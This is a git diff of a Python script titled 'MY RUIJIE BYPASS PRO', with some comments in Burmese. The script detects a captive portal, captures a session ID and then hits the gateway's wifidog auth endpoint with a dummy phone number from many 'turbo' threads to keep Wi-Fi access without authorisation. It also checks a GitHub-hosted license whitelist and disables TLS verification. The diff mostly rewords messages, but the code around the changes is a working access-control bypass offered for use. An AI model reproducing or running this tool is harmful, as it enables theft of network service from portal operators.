@@ -16,8 +16,9 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
 
 # ===============================
-# LICENSE CONFIG (သင့်ရဲ့ Link နဲ့ ပြင်ဆင်ပြီး)
+# LICENSE CONFIG
 # ===============================
+# သင့်ရဲ့ GitHub Raw Link ကို ဒီမှာ ထည့်ထားပါတယ်
 GITHUB_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
 KEY_FILE = os.path.join(os.path.expanduser("~"), ".device_key")
 
@@ -46,7 +47,6 @@ def get_or_create_key():
 
 def check_real_internet():
     try:
-        # Google အစား ပိုမြန်တဲ့ Cloudflare DNS ကို စစ်ကြည့်ပါမယ်
         return requests.get("http://1.1.1.1", timeout=3).status_code == 200
     except:
         return False
@@ -61,7 +61,7 @@ def h_banner():
     print(f"{Fore.CYAN} ██║  ██║███████╗██║  ██║██████╔╝██████╔╝██║██║ ╚████║")
     print(f"{Fore.CYAN} ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝")
     print(f"{Fore.MAGENTA}{'='*55}")
-    print(f"{Fore.WHITE}{Back.RED}      MY RUIJIE BYPASS PRO | OWNER: {Fore.YELLOW}HH TET TET      ")
+    print(f"{Fore.WHITE}{Back.RED}      MY RUIJIE BYPASS PRO | OWNER: HH TET TET      ")
     print(f"{Style.RESET_ALL}{Fore.MAGENTA}{'='*55}\n")
 
 # ===============================
@@ -72,14 +72,14 @@ def high_speed_ping(auth_link, sid):
     while not stop_event.is_set():
         try:
             session.get(auth_link, timeout=5)
-            print(f"{Fore.GREEN}[✓]{Fore.RESET} SID {sid} | Pulse Active...           ", end="\r")
+            print(f"{Fore.GREEN}[✓]{Fore.RESET} SID: {sid} | Pulse Active...           ", end="\r")
         except:
             print(f"{Fore.RED}[X]{Fore.RESET} Connection Lost...               ", end="\r")
             break
         time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
 
 def start_bypass_process():
-    logging.info(f"{Fore.CYAN}Initializing Engine...{Fore.RESET}")
+    logging.info(f"{Fore.CYAN}Initializing Bypass Engine...{Fore.RESET}")
 
     while not stop_event.is_set():
         session = requests.Session()
@@ -98,7 +98,7 @@ def start_bypass_process():
             parsed_portal = urlparse(portal_url)
             portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
 
-            print(f"\n{Fore.CYAN}[*] Captive Portal Detected{Fore.RESET}")
+            print(f"\n{Fore.CYAN}[*] Captive Portal Detected: {portal_host}")
 
             r1 = session.get(portal_url, verify=False, timeout=10)
             path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
@@ -114,14 +114,14 @@ def start_bypass_process():
                 time.sleep(5)
                 continue
 
-            print(f"{Fore.GREEN}[✓]{Fore.RESET} Session ID: {sid}")
+            print(f"{Fore.GREEN}[✓]{Fore.RESET} Captured Session ID: {sid}")
 
             params = parse_qs(parsed_portal.query)
             gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
             gw_port = params.get('gw_port', ['2060'])[0]
 
             auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
-            print(f"{Fore.MAGENTA}[*] Launching {PING_THREADS} Threads...{Fore.RESET}")
+            print(f"{Fore.MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{Fore.RESET}")
 
             for _ in range(PING_THREADS):
                 threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
@@ -130,6 +130,8 @@ def start_bypass_process():
                 time.sleep(5)
 
         except Exception as e:
+            if DEBUG:
+                print(f"Error: {e}")
             time.sleep(5)
 
 # ===============================
@@ -143,6 +145,7 @@ def verify_license():
     print(f"{Fore.CYAN}{'─'*55}")
 
     try:
+        # GitHub ကနေ whitelist ကို ဆွဲယူမယ်
         response = requests.get(GITHUB_URL, timeout=10)
         if response.status_code == 200:
             lines = response.text.splitlines()
@@ -151,19 +154,26 @@ def verify_license():
                     key, status = line.split("|")
                     if key.strip() == user_key:
                         if status.strip().upper() == "ACTIVE":
-                            print(f"{Fore.CYAN}[+] Status: {Fore.BLACK}{Back.GREEN} ACTIVE ")
-                            print(f"{Fore.GREEN}✅ Access Granted! Launching...")
+                            print(f"{Fore.CYAN}[+] Status Check: {Fore.BLACK}{Back.GREEN} ACTIVE ")
+                            print(f"{Fore.GREEN}✅ Access Granted! Launching Engine...")
                             time.sleep(1)
                             return True
                         else:
-                            print(f"{Fore.RED}[!] Status: {Fore.BLACK}{Back.RED} BANNED ")
+                            print(f"{Fore.RED}[!] Status Check: {Fore.BLACK}{Back.RED} BANNED ")
                             sys.exit()
             
+            # Key မရှိရင် ပြမယ့် Error
             print(f"{Fore.RED}❌ ERROR: DEVICE ID NOT REGISTERED")
-            print(f"{Fore.YELLOW}Please add [{user_key}|ACTIVE] to your key.txt on GitHub.")
+            print(f"{Fore.YELLOW}သင့်ရဲ့ GitHub က key.txt ထဲမှာ အောက်ပါအတိုင်း သွားထည့်ပေးပါ:")
+            print(f"{Fore.WHITE}{Back.BLUE} {user_key}|ACTIVE ")
+            sys.exit()
+        else:
+            print(f"{Fore.RED}❌ SERVER ERROR: Code {response.status_code}")
             sys.exit()
     except Exception as e:
-        print(f"{Fore.RED}❌ ERROR: CANNOT CONNECT TO SERVER")
+        print(f"{Fore.RED}❌ ERROR: CANNOT CONNECT TO GITHUB")
+        if DEBUG:
+            print(e)
         sys.exit()
 
 # ===============================
@@ -175,4 +185,4 @@ if __name__ == "__main__":
             start_bypass_process()
     except KeyboardInterrupt:
         stop_event.set()
-        print(f"\n{Fore.RED}Program Stopped...{Fore.RESET}")
+        print(f"\n{Fore.RED}Turbo Engine Shutdown...{Fore.RESET}")
